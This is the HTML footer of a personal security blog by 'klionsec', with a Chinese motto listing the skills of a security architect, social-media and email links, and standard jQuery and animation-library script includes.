多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
<br>
<br>
<br>
<font size=6 color="white">唯一不变的,就是一直在变</font>
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klionsec">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/klionsec">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/klionsec">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.zhihu.com/people/klionsec/activities">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:klion@protonmail.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
                </div>
            </div>
        </div>
    </div>
<!--
<audio autoplay="autoplay" width="300" height="200">
	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
</audio>
-->
</footer>



<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>